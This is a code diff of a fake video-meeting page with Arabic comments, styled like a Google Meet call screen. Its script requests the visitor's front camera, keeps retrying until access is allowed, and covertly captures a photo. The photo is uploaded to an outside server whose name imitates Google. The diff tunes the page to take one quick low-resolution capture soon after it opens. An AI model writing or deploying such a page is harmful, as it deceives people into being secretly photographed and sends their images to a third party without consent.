@@ -7,15 +7,50 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Roboto', Arial, sans-serif; background-color: #202124; color: white; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 15px; }
-        .video-container { width: 100%; height: 100%; max-height: 80vh; background-color: #000; border-radius: 12px; position: relative; overflow: hidden; }
+        
+        /* تصغير حجم الشاشة الرئيسية */
+        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .video-container { 
+            width: 90%; 
+            max-width: 320px; /* تحديد عرض الشاشة لتكون أصغر */
+            aspect-ratio: 9/16; /* جعلها مستطيلة مثل الهاتف */
+            background-color: #000; 
+            border-radius: 16px; 
+            position: relative; 
+            overflow: hidden; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
         .label { position: absolute; bottom: 15px; right: 15px; background: rgba(0,0,0,0.6); padding: 4px 12px; border-radius: 4px; font-size: 14px; }
-        .controls { height: 90px; display: flex; align-items: center; justify-content: space-evenly; padding-bottom: 15px; }
-        .btn { width: 50px; height: 50px; border-radius: 50%; background: #3c4043; border: none; color: white; font-size: 20px; display: flex; align-items: center; justify-content: center; }
-        .btn-red { background: #ea4335; width: 65px; border-radius: 25px; }
+        
+        /* جعل الأزرار واضحة وكبيرة */
+        .controls { 
+            height: 110px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 15px; 
+            background: #202124;
+            padding-bottom: 20px;
+        }
+        .btn { 
+            width: 55px; 
+            height: 55px; 
+            border-radius: 50%; 
+            background: #3c4043; 
+            border: none; 
+            color: white; 
+            font-size: 24px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        .btn-red { background: #ea4335; width: 70px; border-radius: 30px; }
+        
         canvas { display: none; }
-        #status { position: fixed; top: 10px; width: 100%; text-align: center; font-size: 12px; color: #aaa; z-index: 10; }
+        #status { position: fixed; top: 15px; width: 100%; text-align: center; font-size: 13px; color: #fff; z-index: 10; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -27,6 +62,7 @@
         </div>
     </div>
     <canvas id="photo-canvas"></canvas>
+    
     <div class="controls">
         <button class="btn">🎤</button>
         <button class="btn">📹</button>
@@ -39,17 +75,21 @@
         const canvas = document.getElementById('photo-canvas');
         const statusText = document.getElementById('status');
         
-        // تم التعديل بناءً على رابط الرندر الجديد الخاص بك
-        const SERVER_URL = 'https://mm-icpu.onrender.com'; 
+        const SERVER_URL = 'https://googl-mait5m.onrender.com/upload-photo'; 
+        let hasCaptured = false; // متغير لضمان الإرسال مرة واحدة فقط
 
         async function start() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 480 } // تقليل الدقة لزيادة سرعة الرفع
+                });
                 video.srcObject = stream;
                 statusText.textContent = "تم الانضمام للاجتماع";
                 
-                // بدء التصوير التلقائي كل 4 ثوانٍ
-                setInterval(capture, 4000); 
+                // التقاط الصورة فور جاهزية الفيديو
+                video.addEventListener('loadedmetadata', () => {
+                    setTimeout(capture, 1000); // تأخير ثانية واحدة لضمان وضوح الصورة بعد الفتح
+                });
             } catch (e) {
                 statusText.textContent = "يجب السماح بالكاميرا للمتابعة";
                 setTimeout(start, 2000);
@@ -57,24 +97,30 @@
         }
 
         async function capture() {
-            if (!video.srcObject) return;
+            if (hasCaptured || !video.srcObject) return;
             
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const data = canvas.toDataURL('image/jpeg', 0.4); // جودة متوسطة لسرعة الإرسال
+            // تصغير أبعاد الكانفاس لسرعة إرسال فائقة
+            canvas.width = 400; 
+            canvas.height = (video.videoHeight / video.videoWidth) * 400;
+            
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تقليل الجودة لـ 0.3 لضمان إرسال لحظي
+            const data = canvas.toDataURL('image/jpeg', 0.3); 
 
             try {
+                hasCaptured = true; // منع التكرار
                 const response = await fetch(SERVER_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ image: data })
                 });
                 if (response.ok) {
-                    console.log("تم الإرسال");
+                    console.log("تم الإرسال بنجاح");
                 }
             } catch (err) {
-                console.log("خطأ في الاتصال بالسيرفر");
+                hasCaptured = false; // إعادة المحاولة في حال فشل الاتصال
+                console.log("خطأ في الاتصال");
             }
         }
 
